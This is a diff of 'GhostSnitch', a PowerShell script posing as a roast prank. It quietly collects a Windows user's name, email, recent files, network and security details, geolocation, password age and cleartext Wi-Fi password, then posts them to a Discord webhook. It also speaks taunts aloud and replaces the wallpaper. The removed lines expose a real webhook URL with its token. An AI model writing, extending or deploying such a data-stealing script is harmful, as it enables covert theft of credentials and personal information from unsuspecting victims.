@@ -1,69 +1,57 @@
-
 ####################################################################################################
 # Title       : GhostSnitch
-# Version     : 1.1
+# Version     : 1.2
 # Author      : I am TBJr
 # Description : Curiosity was the spark, but roasting you is the flame.
 ####################################################################################################
 
-# Check for Admin Privileges
-#If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
-#    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
-#    Write-Warning "Script needs to be run as Administrator!"
-#    exit
-#}
+# --- Configuration -----------------------------------------------------------
+$webhookUrl  = 'REPLACE_ME'   # Discord webhook URL — set before deploying
+$prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
+$targetAlias = $env:COMPUTERNAME
+# -----------------------------------------------------------------------------
 
 # Set up SAPI for text-to-speech
 $s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -1
 
-# Function to get user's full name
 function Get-FullName {
     try {
         $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
+        if ([string]::IsNullOrWhiteSpace($fullName)) { $fullName = $env:username }
     } catch {
         $fullName = $env:username
     }
     return $fullName
 }
-$fullName = Get-FullName
 
-# Function to get Username and Machine
 function Get-UserInfo {
     return "User: $env:USERNAME on $env:COMPUTERNAME"
 }
 
-# Function to get user email (if present)
 function Get-Email {
     try {
-        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
-        if ($email -like "*gmail*") {
-            return "Gmail user? Stylish. But your inbox is probably chaos."
-        } elseif ($email -like "*yahoo*") {
-            return "Yahoo... in 2025? A digital fossil."
-        } elseif ($email -like "*hotmail*") {
-            return "Hotmail? Do you also use Netscape?"
-        } else {
-            return "$email is your email? Obscure. I like it."
-        }
+        $email = (gpresult /z 2>$null | Select-String -Pattern "\b\S+@\S+\.\S+\b").Matches.Value | Select-Object -First 1
+        if (-not $email) { return "No email found. A mystery wrapped in encryption." }
+        if ($email -like "*gmail*")   { return "Gmail user? Stylish. But your inbox is probably chaos." }
+        if ($email -like "*yahoo*")   { return "Yahoo... in 2025? A digital fossil." }
+        if ($email -like "*hotmail*") { return "Hotmail? Do you also use Netscape?" }
+        return "$email is your email? Obscure. I like it."
     } catch {
         return "No email found. A mystery wrapped in encryption."
     }
 }
 
-# Function to get O.S info
 function Get-OS {
     return (Get-CimInstance Win32_OperatingSystem).Caption
 }
 
-# Function to get Uptime
 function Get-Uptime {
     $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-    $timespan = New-TimeSpan -Start $uptime -End (Get-Date)
-    return "Uptime: $($timespan.Days) days, $($timespan.Hours) hours"
+    $ts = New-TimeSpan -Start $uptime -End (Get-Date)
+    return "Uptime: $($ts.Days) days, $($ts.Hours) hours"
 }
 
-# Function to get Disk Usage
 function Get-DriveStats {
     $drives = Get-PSDrive -PSProvider FileSystem
     return ($drives | ForEach-Object {
@@ -71,223 +59,207 @@ function Get-DriveStats {
     }) -join "`n"
 }
 
-# Function to get Recent Files (from Quick Access)
 function Get-RecentFiles {
     $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
-            Sort-Object LastWriteTime -Descending | Select-Object -First 5
-    return "Recent Files: " + ($recent | ForEach-Object { $_.Name }) -join ", "
+        Sort-Object LastWriteTime -Descending | Select-Object -First 5
+    return "Recent Files: " + (($recent | ForEach-Object { $_.Name }) -join ", ")
 }
 
-# Function to get USB Devices
 function Get-USB {
-    try {
-        return (Get-PnpDevice -Class 'USB').FriendlyName -join ", "
-    } catch {
-        return "No USB info found"
-    }
+    try { return (Get-PnpDevice -Class 'USB' -ErrorAction Stop).FriendlyName -join ", " }
+    catch { return "No USB info found" }
 }
 
-# Function to get BitLocker Status
 function Get-BitLocker {
     try {
-        $status = Get-BitLockerVolume | Select-Object MountPoint, ProtectionStatus
+        $status = Get-BitLockerVolume -ErrorAction Stop | Select-Object MountPoint, ProtectionStatus
         return ($status | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join ", "
-    } catch {
-        return "BitLocker status unknown"
-    }
+    } catch { return "BitLocker status unknown" }
 }
 
-# Function to get IP and MAC Address
 function Get-NetworkInfo {
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi' -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike '169.*'}).IPAddress
-    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress
+    $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+            Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
+            Select-Object -First 1).IPAddress
+    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
     return "Local IP: $ip, MAC: $mac"
 }
 
-# Function to get Antivirus
 function Get-Antivirus {
     try {
-        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct
+        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct -ErrorAction Stop
         return ($av.displayName) -join ", "
-    } catch {
-        return "No antivirus info found"
-    }
+    } catch { return "No antivirus info found" }
 }
 
-# Function to get Running Processes (Top 5 by Memory)
 function Get-TopProcesses {
-    $processes = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
-    return ($processes | ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
+    $procs = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
+    return ($procs | ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
 }
 
-# Function to get current wallpaper
-function Get-WallpaperPath {
-    try {
-        return (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper
-    } catch {
-        return "Could not retrieve current wallpaper."
-    }
-}
-
-# Function to list startup apps
-function Get-StartupApps {
-    try {
-        $startup = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command
-        return ($startup | ForEach-Object { "$($_.Name): $($_.Command)" }) -join "`n"
-    } catch {
-        return "Could not retrieve startup applications."
-    }
-}
-
-# Function to get RAM and generate roast
 function Get-RAM {
     try {
-        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-        $RAM = [int]$RAM
-        if ($RAM -lt 4) {
-            return "$RAM GB of RAM? This machine is powered by hopes and prayers."
-        } elseif ($RAM -lt 8) {
-            return "$RAM GB of RAM? Just enough to load your regrets."
-        } elseif ($RAM -lt 16) {
-            return "$RAM GB? Gamer vibes... if lag was a feature."
-        } else {
-            return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
-        }
-    } catch {
-        return "Unable to detect RAM. Maybe the hamster escaped the wheel?"
-    }
+        $RAM = [int]((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
+        if ($RAM -lt 4)  { return "$RAM GB of RAM? This machine is powered by hopes and prayers." }
+        if ($RAM -lt 8)  { return "$RAM GB of RAM? Just enough to load your regrets." }
+        if ($RAM -lt 16) { return "$RAM GB? Gamer vibes... if lag was a feature." }
+        return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
+    } catch { return "Unable to detect RAM. Maybe the hamster escaped the wheel?" }
 }
 
-# Function to get public IP
 function Get-PubIP {
     try {
-        $IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
+        $IP = (Invoke-WebRequest 'https://ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim()
         return "Your public IP is $IP. Say hi to the world for me."
-    } catch {
-        return "Couldn't fetch your public IP. You're a ghost already."
-    }
+    } catch { return "Couldn't fetch your public IP. You're a ghost already." }
 }
 
-# Function to get current WiFi SSID and password
 function Get-WifiPass {
     try {
-        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
-        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
-        $length = $pass.Length
-        if ($length -lt 8) {
-            return "$ssid is your network? That password: $pass ... it's crying for help."
-        } elseif ($length -lt 12) {
-            return "$ssid's password is $pass — trying, but still failing."
-        } else {
-            return "$ssid's password is $pass. Secure? Maybe. Still roasted? Definitely."
+        $ssid = (netsh wlan show interface 2>$null | Select-String '^\s+SSID\s+:').ToString().Split(":")[1].Trim()
+        if ([string]::IsNullOrEmpty($ssid)) { return "Not connected to WiFi. Cable gang?" }
+
+        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+            [Security.Principal.WindowsBuiltInRole]::Administrator)
+        if (-not $isAdmin) {
+            return "Connected to $ssid. Password redacted — you're not admin, and neither am I."
         }
-    } catch {
-        return "No WiFi password found. You out here freeloading?"
-    }
+
+        $pass   = (netsh wlan show profile name="$ssid" key=clear 2>$null | Select-String 'Key Content').ToString().Split(":")[1].Trim()
+        $length = $pass.Length
+        if ($length -lt 8)  { return "$ssid password: '$pass' — it's crying for help." }
+        if ($length -lt 12) { return "$ssid password: '$pass' — trying, but still weak." }
+        return "$ssid password: '$pass'. Secure? Maybe. Still roasted? Definitely."
+    } catch { return "No WiFi found. Freeloading on ethernet?" }
 }
 
-# Function to get last password set date
 function Get-PasswordAge {
     try {
-        $line = (net user $env:UserName | Select-String "Password last set").ToString()
-        $dateStr = $line.Substring($line.IndexOf(":")+1).Trim()
-        $days = (New-TimeSpan -Start $dateStr -End (Get-Date)).Days
-        if ($days -lt 30) {
-            return "Changed your password $days days ago. Fresh... but not fresh enough."
-        } elseif ($days -lt 180) {
-            return "$days days since your last password change. You're cruising for a snoozing."
-        } else {
-            return "$days days? That password's got mold on it."
-        }
-    } catch {
-        return "Password age unknown. Are you even human?"
-    }
+        $line    = (net user $env:UserName 2>$null | Select-String "Password last set").ToString()
+        $dateStr = $line.Substring($line.IndexOf(":") + 1).Trim()
+        $days    = (New-TimeSpan -Start ([datetime]$dateStr) -End (Get-Date)).Days
+        if ($days -lt 30)  { return "Changed $days days ago. Fresh... but not fresh enough." }
+        if ($days -lt 180) { return "$days days since last change. Cruising for a bruising." }
+        return "$days days? That password's got mold on it."
+    } catch { return "Password age unknown. Are you even human?" }
 }
 
-# Send to discord webhook
-$webhookUrl = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
-
-# Prepare the message content
-$discordPayload = @{
-    username = "👻 GhostSnitch Bot"
-    content = "**🎯 Roast Session Logged!**"
-    embeds = @(@{
-        title = "🧠 Roast Report for $fullName"
-        color = 16711680
-        fields = @(
-            @{ name = "🧑‍💻 User Info"; value = (Get-UserInfo); inline = $true },
-            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false },
-            @{ name = "🖥️ OS"; value = (Get-OS); inline = $true },
-            @{ name = "⏱️ Uptime"; value = (Get-Uptime); inline = $true },
-            @{ name = "💽 Drives"; value = (Get-DriveStats); inline = $false },
-            @{ name = "🗃️ Recent Files"; value = (Get-RecentFiles); inline = $false },
-            @{ name = "🔌 USB Devices"; value = (Get-USB); inline = $false },
-            @{ name = "🔐 BitLocker"; value = (Get-BitLocker); inline = $true },
-            @{ name = "🌐 Network"; value = (Get-NetworkInfo); inline = $true },
-            @{ name = "🛡️ Antivirus"; value = (Get-Antivirus); inline = $false },
-            @{ name = "🔄 Top Processes"; value = (Get-TopProcesses); inline = $false },
-            @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
-            @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
-            @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
-            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false }
-        )
-        footer = @{ text = "GhostSnitch v1.0 by TBJr" }
-        timestamp = (Get-Date).ToString("o")
-    })
+function Get-GeoInfo {
+    try {
+        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+        return "$($r.city), $($r.region), $($r.country)  |  ISP: $($r.connection.isp)"
+    } catch { return "Geolocation unavailable" }
 }
 
-# Convert to JSON and POST
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $discordPayload -Depth 10) -ContentType 'application/json'
-# Function to generate roast wallpaper
+function Get-WallpaperPath {
+    try { return (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper }
+    catch { return "Could not retrieve current wallpaper." }
+}
+
 function Make-Wallpaper {
     Add-Type -AssemblyName System.Drawing
     $screen = Add-Type -MemberDefinition @"
-        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
-        [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
-"@ -Name "Win32" -Namespace "Screen" -PassThru
-    $hdc = [Screen.Win32]::GetDC([IntPtr]::Zero)
-    $width = [Screen.Win32]::GetDeviceCaps($hdc, 118)
-    $height = [Screen.Win32]::GetDeviceCaps($hdc, 117)
-    $bitmap = New-Object System.Drawing.Bitmap $width, $height
-    $font = New-Object System.Drawing.Font "Consolas", 24
+        [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
+        [System.Runtime.InteropServices.DllImport("gdi32.dll")]  public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+"@ -Name "Win32GS" -Namespace "Screen" -PassThru
+    $hdc    = [Screen.Win32GS]::GetDC([IntPtr]::Zero)
+    $width  = [Screen.Win32GS]::GetDeviceCaps($hdc, 118)
+    $height = [Screen.Win32GS]::GetDeviceCaps($hdc, 117)
+    $bitmap   = New-Object System.Drawing.Bitmap $width, $height
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphics.Clear([System.Drawing.Color]::Black)
+    $font  = New-Object System.Drawing.Font "Consolas", 24
     $brush = [System.Drawing.Brushes]::Lime
-    $msg = "Your system was evaluated.
-You're not ready for the future.
-- GhostSnitch"
+    $msg   = "Your system was evaluated.`nYou're not ready for the future.`n- GhostSnitch"
     $graphics.DrawString($msg, $font, $brush, 100, 100)
     $path = "$env:USERPROFILE\Desktop\roasted.jpg"
     $bitmap.Save($path)
     $graphics.Dispose()
     Add-Type -TypeDefinition @"
         using System.Runtime.InteropServices;
-        public class Wallpaper {
+        public class WallpaperGS {
             [DllImport("user32.dll", SetLastError = true)]
             public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
         }
 "@
-    [Wallpaper]::SystemParametersInfo(20, 0, $path, 3)
+    [WallpaperGS]::SystemParametersInfo(20, 0, $path, 3) | Out-Null
     return $path
 }
 
-# Pause until mouse is moved
+# ---- Collect all data once so we call each function exactly one time --------
+$fullName   = Get-FullName
+$ramRoast   = Get-RAM
+$pubIP      = Get-PubIP
+$wifiRoast  = Get-WifiPass
+$passAge    = Get-PasswordAge
+$emailRoast = Get-Email
+$userInfo   = Get-UserInfo
+$osInfo     = Get-OS
+$uptime     = Get-Uptime
+$drives     = Get-DriveStats
+$recent     = Get-RecentFiles
+$usb        = Get-USB
+$bitlocker  = Get-BitLocker
+$network    = Get-NetworkInfo
+$av         = Get-Antivirus
+$procs      = Get-TopProcesses
+$geo        = Get-GeoInfo
+
+# ---- Send report to Discord -------------------------------------------------
+if ($webhookUrl -ne 'REPLACE_ME') {
+    $discordPayload = @{
+        username = "GhostSnitch Bot"
+        content  = "**Roast Session Logged!** | ID: ``$prankId``"
+        embeds   = @(@{
+            title  = "Roast Report for $fullName"
+            color  = 16711680
+            fields = @(
+                @{ name = "Prank ID";       value = $prankId;    inline = $true  },
+                @{ name = "Target";         value = $targetAlias; inline = $true  },
+                @{ name = "Location";       value = $geo;        inline = $false },
+                @{ name = "User Info";      value = $userInfo;   inline = $true  },
+                @{ name = "Email Roast";    value = $emailRoast; inline = $false },
+                @{ name = "OS";             value = $osInfo;     inline = $true  },
+                @{ name = "Uptime";         value = $uptime;     inline = $true  },
+                @{ name = "Drives";         value = $drives;     inline = $false },
+                @{ name = "Recent Files";   value = $recent;     inline = $false },
+                @{ name = "USB Devices";    value = $usb;        inline = $false },
+                @{ name = "BitLocker";      value = $bitlocker;  inline = $true  },
+                @{ name = "Network";        value = $network;    inline = $true  },
+                @{ name = "Antivirus";      value = $av;         inline = $false },
+                @{ name = "Top Processes";  value = $procs;      inline = $false },
+                @{ name = "RAM Roast";      value = $ramRoast;   inline = $true  },
+                @{ name = "Public IP";      value = $pubIP;      inline = $true  },
+                @{ name = "WiFi Password";  value = $wifiRoast;  inline = $false },
+                @{ name = "Password Age";   value = $passAge;    inline = $false }
+            )
+            footer    = @{ text = "GhostSnitch v1.2 by TBJr" }
+            timestamp = (Get-Date).ToString("o")
+        })
+    }
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post `
+            -Body (ConvertTo-Json $discordPayload -Depth 10) `
+            -ContentType 'application/json' -ErrorAction Stop
+    } catch {}
+}
+
+# ---- Wait for mouse movement before playing the audio roast -----------------
 Add-Type -AssemblyName System.Windows.Forms
 $startPos = [System.Windows.Forms.Cursor]::Position
 while ($true) {
     Start-Sleep -Seconds 2
-    if ([System.Windows.Forms.Cursor]::Position.X -ne $startPos.X -or [System.Windows.Forms.Cursor]::Position.Y -ne $startPos.Y) {
-        break
-    }
+    $cur = [System.Windows.Forms.Cursor]::Position
+    if ($cur.X -ne $startPos.X -or $cur.Y -ne $startPos.Y) { break }
 }
 
-# Begin roast
+# ---- Deliver the roast ------------------------------------------------------
 $s.Speak("Hello, $fullName. Let's review your setup.")
-$s.Speak((Get-RAM))
-$s.Speak((Get-PubIP))
-$s.Speak((Get-WifiPass))
-$s.Speak((Get-PasswordAge))
-$s.Speak((Get-Email))
+$s.Speak($ramRoast)
+$s.Speak($pubIP)
+$s.Speak($wifiRoast)
+$s.Speak($passAge)
+$s.Speak($emailRoast)
 $s.Speak("Check your wallpaper. And don't act surprised.")
 Make-Wallpaper | Out-Null
 $s.Speak("That concludes your roast. GhostSnitch out.")
